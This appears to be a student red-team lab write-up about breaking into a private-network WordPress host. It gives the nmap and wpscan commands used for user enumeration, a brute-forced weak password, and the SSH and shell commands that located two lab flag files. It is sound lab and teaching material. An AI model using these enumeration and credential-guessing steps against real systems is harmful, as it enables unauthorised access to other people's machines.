# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sV 192.168.1.110
```
![NMAP scan](https://github.com/guerriericp/Final_Project/blob/main/Images/nmap_scan_final_project.png "NMAP scan")

This scan identifies the services below as potential points of entry:
- Target 1
 1. Port 22/TCP 	    Open 	SSH
 2. Port 80/TCP 	    Open 	HTTP
 3. Port 111/TCP 	Open 	rcpbind
 4. Port 139/TCP 	Open 	netbios-ssn
 5. Port 445/TCP 	Open 	netbios-ssn


The following vulnerabilities were identified on each target:
- Target 1
 1. User Enumeration
 2. Weak user password
 3. Misconfiguration of User Priviledges 

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: b9bbcb33ellb80be759c4e844862482d
    - **Exploit Used**
      - WPScan to enumerate users of the targeted WordPress site
      - `$ wpscan --url http://192.168.1.110 --enumerate u`
    - User 'Michael' is our target
      - Using a brute force attack we are able to guess Michael's very simple password
      - The users password: michael
    - Finding 'Flag 1'
      - `ssh michael@192.168.1.110`
      - `pwd: michael`
      - `cd ../../`
      - `cd var/www/html`
      - `ls -l`
      - `grep -i 'flag1' service.html`
     
![flag1](https://github.com/guerriericp/Final_Project/blob/main/Images/flag_1redteam.png "Flag 1")
 
 - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
    - **Exploit Used**
      - same exploit used on flag 1. While still SSH in user 'Michael' looking through other directories I was able to find flag 2.
    - Commands:
      - `ssh michael@192.168.1.110`
      - `pwd: michael`
      - `cd ../../`
      - `cd var/www`
      - `ls -l`
      - `cat flag2.txt`
     
![flag 2](https://github.com/guerriericp/Final_Project/blob/main/Images/flag_2redteam.png "Flag 2")
